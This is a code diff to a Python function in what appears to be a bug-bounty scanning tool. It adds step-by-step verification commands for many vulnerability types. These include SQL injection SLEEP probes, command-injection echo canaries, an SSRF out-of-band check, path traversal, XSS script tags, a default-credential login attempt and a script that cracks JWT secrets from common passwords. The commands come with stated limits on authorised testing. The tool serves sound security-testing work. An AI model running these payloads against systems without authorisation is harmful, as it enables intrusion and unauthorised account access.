@@ -5008,64 +5008,131 @@ def _tutorial_note(alert_type: str) -> str:
 
     if "sql inject" in atype:
         guidance = (
-            "Reproduce the error manually using curl with the payload. "
-            "Confirm the error message appears consistently. "
-            "Do NOT attempt to extract data — error confirmation is sufficient for reporting."
+            "1. Reproduce manually:\n"
+            "   curl -s \"https://target.com/page?param=test'\" | grep -i 'sql\\|syntax\\|error'\n"
+            "2. Confirm with a safe time-based check:\n"
+            "   curl -s -o /dev/null -w '%{time_total}' \\\n"
+            "     \"https://target.com/page?param=1+AND+SLEEP(2)--\"\n"
+            "   If response time is ~2s longer than baseline,\n"
+            "   time-based blind SQLi is likely confirmed.\n"
+            "Do NOT extract data — confirming the error or delay is sufficient for reporting."
         )
     elif "command inject" in atype or "cmdi" in atype:
         guidance = (
-            "Check if canary appears as plain text output, not URL-encoded in an attribute. "
-            "A real finding shows command output, not reflected URL parameters."
+            "1. Test if canary appears as plain text output:\n"
+            "   curl -s 'https://target.com/page?param=test%3Becho%20verify-123'\n"
+            "   Look for 'verify-123' as unencoded plain text\n"
+            "   in response body, NOT inside a URL or attribute.\n"
+            "2. If plain text output confirmed, document with:\n"
+            "   curl -v 'https://target.com/page?param=test%3Becho%20verify-123' 2>&1\n"
+            "Do NOT run destructive commands — echo output confirmation is sufficient."
         )
     elif "ssrf" in atype:
         guidance = (
-            "Use an out-of-band interaction server like interact.sh to confirm the server "
-            "makes outbound requests. Document the DNS/HTTP interaction as proof."
+            "1. Register an interact.sh session:\n"
+            "   curl -s -X POST https://interact.sh/api/v1/register\n"
+            "   Note the correlation-id and subdomain returned.\n"
+            "2. Send the SSRF payload:\n"
+            "   curl -s 'https://target.com/page?url=http://YOUR-ID.interact.sh'\n"
+            "3. Poll for interactions:\n"
+            "   curl -s 'https://interact.sh/api/v1/poll?id=YOUR-ID&secret=YOUR-SECRET'\n"
+            "DNS or HTTP interaction from target IP = confirmed SSRF."
         )
     elif "idor" in atype:
         guidance = (
-            "Create two test accounts. Access Account B's resources using Account A's session. "
-            "Never access real user data — test accounts only."
+            "1. Set up two test accounts — Account A and Account B.\n"
+            "2. Find a resource owned by Account B:\n"
+            "   curl -s 'https://target.com/api/resource/ACCOUNT-B-ID' \\\n"
+            "     -H 'Authorization: Bearer ACCOUNT-A-TOKEN'\n"
+            "3. If Account B's data is returned using Account A's token,\n"
+            "   IDOR is confirmed.\n"
+            "Never access real user data — use test accounts only."
         )
     elif "takeover" in atype:
         guidance = (
-            "Confirm the CNAME target returns a service-specific 404 fingerprint. "
-            "Verify the GitHub org/S3 bucket/service namespace is unclaimed. "
-            "Do NOT claim the resource."
+            "1. Confirm the CNAME is dangling:\n"
+            "   dig CNAME vulnerable.target.com\n"
+            "2. Confirm the target returns an unclaimed fingerprint:\n"
+            "   curl -s 'https://vulnerable-target.github.io' | grep -i '404\\|not found'\n"
+            "3. Confirm the GitHub org does not exist:\n"
+            "   curl -s -o /dev/null -w '%{http_code}' \\\n"
+            "     'https://github.com/orgname'\n"
+            "   404 = org does not exist = claimable namespace.\n"
+            "Do NOT claim the resource — document and report only."
         )
     elif "xss" in atype:
         guidance = (
-            "Confirm the payload executes in a browser context. "
-            "Use a benign alert(1) payload only. Document with a screenshot."
+            "1. Confirm reflection in response:\n"
+            "   curl -s 'https://target.com/page?param=<script>alert(1)</script>' \\\n"
+            "     | grep -i 'script'\n"
+            "2. Confirm execution in browser:\n"
+            "   Open the URL in a browser and verify alert fires.\n"
+            "3. Document with a screenshot of the alert dialog.\n"
+            "Use alert(1) only — do not steal cookies or exfiltrate data."
         )
     elif "open redirect" in atype:
         guidance = (
-            "Confirm the Location header contains your injected URL. "
-            "Show the redirect chain. Demonstrate additional impact beyond the redirect "
-            "itself for higher severity."
+            "1. Check the Location header:\n"
+            "   curl -s -o /dev/null -w '%{redirect_url}' \\\n"
+            "     'https://target.com/redirect?url=https://example.com'\n"
+            "   If Location contains example.com, redirect confirmed.\n"
+            "2. Demonstrate additional impact for higher severity —\n"
+            "   show the redirect can be used for phishing by\n"
+            "   crafting a realistic URL."
         )
     elif "jwt" in atype:
         guidance = (
-            "Confirm the secret cracks successfully with PyJWT. "
-            "Forge a test token with a modified claim using a clearly fake value. "
-            "Do NOT use the forged token against real endpoints."
+            "python3 -c \"\n"
+            "import jwt, sys\n"
+            "token = 'PASTE_TOKEN_HERE'\n"
+            "for secret in ['secret','password','123456','your-256-bit-secret']:\n"
+            "    try:\n"
+            "        decoded = jwt.decode(token, secret, algorithms=['HS256'])\n"
+            "        print(f'Cracked with secret: {secret}')\n"
+            "        print(decoded)\n"
+            "        sys.exit(0)\n"
+            "    except: pass\n"
+            "print('Not cracked with common secrets')\n"
+            "\"\n"
+            "Do NOT forge tokens to access other accounts."
         )
     elif "default credential" in atype:
         guidance = (
-            "Confirm the response body contains service-specific authenticated content "
-            "(logout button, database listing, dashboard). "
-            "A bare 200 is not sufficient confirmation."
+            "1. Confirm service is genuine with body verification:\n"
+            "   curl -s 'https://target.com/admin' | grep -i \\\n"
+            "     'select database\\|adminer\\|logout\\|dashboard'\n"
+            "2. Attempt login with default credentials:\n"
+            "   curl -s -X POST 'https://target.com/admin' \\\n"
+            "     -d 'username=admin&password=admin' | grep -i \\\n"
+            "     'logout\\|welcome\\|dashboard'\n"
+            "   Presence of authenticated content confirms access.\n"
+            "Document immediately and do not exercise any\n"
+            "functionality beyond confirming login."
         )
     elif "mass assignment" in atype:
         guidance = (
-            "Send a GET request after the POST to confirm the injected field was persisted. "
-            "Use false/none values for privilege fields, never true or admin."
+            "1. Send request with injected field:\n"
+            "   curl -s -X POST 'https://target.com/api/profile' \\\n"
+            "     -H 'Content-Type: application/json' \\\n"
+            "     -H 'Authorization: Bearer YOUR-TOKEN' \\\n"
+            "     -d '{\"name\":\"test\",\"role\":\"test-role-probe\"}'\n"
+            "2. Fetch the resource to confirm persistence:\n"
+            "   curl -s 'https://target.com/api/profile' \\\n"
+            "     -H 'Authorization: Bearer YOUR-TOKEN' | grep 'role'\n"
+            "   If test-role-probe appears in GET response,\n"
+            "   field was persisted — confirmed mass assignment.\n"
+            "Use false/none values only, never admin:true."
         )
     elif "path traversal" in atype:
         guidance = (
-            "Confirm the response contains expected file content "
-            "(etc/hostname is safe to check). "
-            "Do NOT read sensitive files like /etc/passwd or private keys."
+            "1. Test with a safe non-sensitive file:\n"
+            "   curl -s 'https://target.com/page?file=../../../etc/hostname'\n"
+            "   /etc/hostname contains only the server hostname —\n"
+            "   safe to read, confirms traversal without exposing\n"
+            "   sensitive data.\n"
+            "2. Confirm the response contains a hostname string\n"
+            "   rather than an error or the original page.\n"
+            "Do NOT read /etc/passwd, private keys, or credentials."
         )
     elif any(k in atype for k in (
         "missing hsts", "missing csp", "missing x-frame",
@@ -5073,32 +5140,49 @@ def _tutorial_note(alert_type: str) -> str:
         "security header",
     )):
         guidance = (
-            "Confirm with curl -I that the header is absent. "
-            "Note that this is informational — combine with a demonstration of "
-            "impact for higher severity."
+            "   curl -sI 'https://target.com' | grep -i \\\n"
+            "     'strict-transport\\|x-frame\\|x-content-type\\|content-security'\n"
+            "   Missing headers will not appear in output.\n"
+            "Combine with a demonstration of impact for\n"
+            "higher severity — missing headers alone are\n"
+            "typically low or informational."
         )
     elif "spf" in atype or "dmarc" in atype:
         guidance = (
-            "Use MXToolbox or dig to confirm the DNS record state. "
-            "Include the raw DNS response in your report."
+            "1. Check SPF record:\n"
+            "   dig TXT target.com | grep 'v=spf'\n"
+            "2. Check DMARC record:\n"
+            "   dig TXT _dmarc.target.com | grep 'v=DMARC'\n"
+            "3. Check DKIM selectors:\n"
+            "   dig TXT default._domainkey.target.com\n"
+            "   dig TXT google._domainkey.target.com\n"
+            "Include raw dig output in your report."
         )
     elif "race condition" in atype:
         guidance = (
-            "Confirm the finding is reproducible by running the burst manually using curl "
-            "or Burp Suite's Turbo Intruder. Send 10 simultaneous requests and check if "
-            "multiple succeed where only one should. "
-            "Confirm impact by checking if multiple distinct resource IDs, tokens, or "
-            "confirmations are returned across the concurrent responses — identical responses "
-            "indicate idempotency, not a race condition. "
-            "Only test on your own account and authorized targets. "
-            "Do not attempt to redeem coupons, complete purchases, or obtain goods/services "
-            "— confirm the vulnerability exists and stop. "
-            "Document the concurrent request burst and response differences as proof of concept."
+            "1. Use Python to send concurrent requests:\n"
+            "python3 -c \"\n"
+            "import threading, requests, time\n"
+            "url = 'https://target.com/api/endpoint'\n"
+            "headers = {'Authorization': 'Bearer YOUR-TOKEN'}\n"
+            "results = []\n"
+            "def send():\n"
+            "    r = requests.post(url, headers=headers)\n"
+            "    results.append((r.status_code, r.text[:100]))\n"
+            "threads = [threading.Thread(target=send) for _ in range(10)]\n"
+            "[t.start() for t in threads]\n"
+            "[t.join() for t in threads]\n"
+            "for r in results: print(r)\n"
+            "\"\n"
+            "2. Check if multiple requests returned distinct\n"
+            "   success responses with different IDs or tokens.\n"
+            "Only test on your own account. Do not complete\n"
+            "purchases or redeem coupons."
         )
     else:
         return ""
 
-    return f"\n\nHOW TO VERIFY: {_TUTORIAL_AUTH_NOTE} {guidance}"
+    return f"\n\nHOW TO VERIFY: {_TUTORIAL_AUTH_NOTE}\n\n{guidance}"
 
 
 def alert(alert_type, severity, target, detail, redact_detail=False, response_body=None):
